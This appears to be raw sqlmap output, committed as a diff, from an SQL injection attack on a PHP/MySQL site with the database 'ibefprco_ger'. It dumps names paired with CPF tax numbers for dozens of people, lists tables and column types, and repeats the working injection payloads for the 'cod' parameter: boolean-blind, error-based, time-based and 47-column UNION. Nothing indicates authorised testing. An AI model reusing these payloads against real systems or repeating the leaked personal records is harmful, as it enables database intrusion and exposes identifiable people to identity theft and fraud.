+| NULL   | NULL       | NULL   | NULL   | NULL    | 085.702.927-96 | NULL    | NULL    | NULL    | NULL    | 109     | NULL     | NULL     | REGIANE FURTADO CROESY JENKINS             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 021.876.379-48 | NULL    | NULL    | NULL    | NULL    | 110     | NULL     | NULL     | ANA PAULA FARIA DA SILVA                   | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 821.717.857-72 | NULL    | NULL    | NULL    | NULL    | 111     | NULL     | NULL     | RENATO DE MORAES GONÇALVES                 | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 027.320.985-07 | NULL    | NULL    | NULL    | NULL    | 112     | NULL     | NULL     | MAURÍCIO DA SILVA DONATI                   | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 577.456.920-91 | NULL    | NULL    | NULL    | NULL    | 113     | NULL     | NULL     | MARCOS DE BEM GUAZZELLI                    | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 519.821.619-49 | NULL    | NULL    | NULL    | NULL    | 114     | NULL     | NULL     | HENRIQUE GAEDE                             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 913.054.039-91 | NULL    | NULL    | NULL    | NULL    | 97      | NULL     | NULL     | CARLA BARUSSO MEDAGLIA HAESBAERT           | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 285.621.789-34 | NULL    | NULL    | NULL    | NULL    | 96      | NULL     | NULL     | CLECIO LUIZ CHIAMULERA                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 321.137.618-66 | NULL    | NULL    | NULL    | NULL    | 79      | NULL     | NULL     | CELSO FARIA PORTELA PEREIRA                | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 007.183.199-15 | NULL    | NULL    | NULL    | NULL    | 80      | NULL     | NULL     | ANTONIO ROMAO MONTES                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 655.644.058-20 | NULL    | NULL    | NULL    | NULL    | 81      | NULL     | NULL     | PEDRO JAIME CERVATTI                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 146.996.139-34 | NULL    | NULL    | NULL    | NULL    | 82      | NULL     | NULL     | LEANDRO GERVASIO SUSKI                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 157.224.819-04 | NULL    | NULL    | NULL    | NULL    | 83      | NULL     | NULL     | MAURI MENDES                               | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 013.082.448-86 | NULL    | NULL    | NULL    | NULL    | 84      | NULL     | NULL     | ANTONIO SERAFIM DAMIANI                    | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 025.775.249-86 | NULL    | NULL    | NULL    | NULL    | 85      | NULL     | NULL     | OSVALDO RODRIGO ARCE RISSETTI              | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 359.920.858-15 | NULL    | NULL    | NULL    | NULL    | 86      | NULL     | NULL     | JOSE ECIO PEREIRA DA COSTA JR.             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 109.860.499-72 | NULL    | NULL    | NULL    | NULL    | 87      | NULL     | NULL     | HAROLDO KRUGER                             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 724.328.459-00 | NULL    | NULL    | NULL    | NULL    | 88      | NULL     | NULL     | LUIZ ANTONIO GIACOMASSI CAVET              | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 217.268.841-04 | NULL    | NULL    | NULL    | NULL    | 89      | NULL     | NULL     | AGENERIO LUIZ COELHO                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 149.917.078-54 | NULL    | NULL    | NULL    | NULL    | 90      | NULL     | NULL     | MARIO TANNHAUSER                           | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 758.378.119-15 | NULL    | NULL    | NULL    | NULL    | 91      | NULL     | NULL     | KARLIS JONATAN KRUKLIS                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 034.627.819-87 | NULL    | NULL    | NULL    | NULL    | 92      | NULL     | NULL     | VANDER DELLA COLETTA                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 016.871.839-10 | NULL    | NULL    | NULL    | NULL    | 93      | NULL     | NULL     | JOÃO ALBERTO DIAS PANCERI                  | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 819.770.269-15 | NULL    | NULL    | NULL    | NULL    | 94      | NULL     | NULL     | EDEVAL ANTONIO DA SILVA                    | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 714.660.299-00 | NULL    | NULL    | NULL    | NULL    | 95      | NULL     | NULL     | LUIZ GUSTAVO CABRAL                        | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 260.684.088-76 | NULL    | NULL    | NULL    | NULL    | 115     | NULL     | NULL     | NEWTON KENJI NAGOSHI                       | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 709.647.189-87 | NULL    | NULL    | NULL    | NULL    | 116     | NULL     | NULL     | EDUARDO BACH ANELLI                        | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 611.971.900-82 | NULL    | NULL    | NULL    | NULL    | 136     | NULL     | NULL     | DERLI KOEFENDER                            | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 020.355.209-16 | NULL    | NULL    | NULL    | NULL    | 137     | NULL     | NULL     | WILIAN SOBREIRA DA SILVA                   | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 031.457.979-64 | NULL    | NULL    | NULL    | NULL    | 138     | NULL     | NULL     | JOÃO PAULO BETTEGA DE ALBUQUERQUE MARANHÃO | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 003.974.029-37 | NULL    | NULL    | NULL    | NULL    | 139     | NULL     | NULL     | RODRIGO CEREDA                             | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 001.396.117-97 | NULL    | NULL    | NULL    | NULL    | 140     | NULL     | NULL     | MARCOS ANDREETTO PERILLO                   | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 647.559.757-00 | NULL    | NULL    | NULL    | NULL    | 141     | NULL     | NULL     | EDUARDO SANTOS ANDRADE                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 544.318.919-00 | NULL    | NULL    | NULL    | NULL    | 142     | NULL     | NULL     | EVERLI VITORIA CHANDOHA                    | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 728.837.589-72 | NULL    | NULL    | NULL    | NULL    | 143     | NULL     | NULL     | URSULA MARIA SIMIÃO FRANÇA POLSAQUE        | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 774.201.289-87 | NULL    | NULL    | NULL    | NULL    | 144     | NULL     | NULL     | MOACIR GOMES DA SILVA                      | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 037.059.028-73 | NULL    | NULL    | NULL    | NULL    | 145     | NULL     | NULL     | ADRIANO RUDEK DE MOURA                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
+| NULL   | NULL       | NULL   | NULL   | NULL    | 054.159.808-22 | NULL    | NULL    | NULL    | NULL    | 146     | NULL     | NULL     | FLAVIO GOMES MALNARCIC                     | 0        | NULL     | NULL     | s         | NULL      | NULL      | NULL      | NULL      | NULL      | NULL       | NULL       | NULL       | NULL       | NULL        | NULL        | NULL        | NULL        | NULL        | 0           | NULL         | NULL         | NULL         | NULL          | NULL          | NULL           | NULL            | NULL            | NULL             | NULL                |
++--------+------------+--------+--------+---------+----------------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------+----------+----------+----------+-----------+-----------+-----------+-----------+-----------+-----------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+------------------+---------------------+
+
+Database: ibefprco_ger
+Table: t_user
+[13 entries]
++----------+
+| user_cod |
++----------+
+| 1        |
+| 2        |
+| 3        |
+| 4        |
+| 5        |
+| 6        |
+| 7        |
+| 8        |
+| 9        |
+| 10       |
+| 11       |
+| 12       |
+| 13       |
++----------+
+
+Database: ibefprco_ger
+Table: t_videos
+[2 entries]
++-----------+
+| video_cod |
++-----------+
+| 1         |
+| 2         |
++-----------+
+
+Database: ibefprco_ger
+Table: t_votos
+[50 entries]
++-----------+
+| socio_cod |
++-----------+
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
+| 0         |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+Table: t_socios
+[1 column]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| soc_cod | int(10) |
++---------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+Table: t_socios_info
+[1 column]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| cod    | int(10) |
++--------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+Table: t_empresas
+[1 column]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| codigo | int(10) |
++--------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+[55 tables]
++---------------------------+
+| t_artigos                 |
+| t_auditoria               |
+| t_banners                 |
+| t_candidatos              |
+| t_comunicados             |
+| t_contacorrente           |
+| t_contacorrente_cnr       |
+| t_downloads               |
+| t_downloads_arquivos      |
+| t_empresas                |
+| t_estados                 |
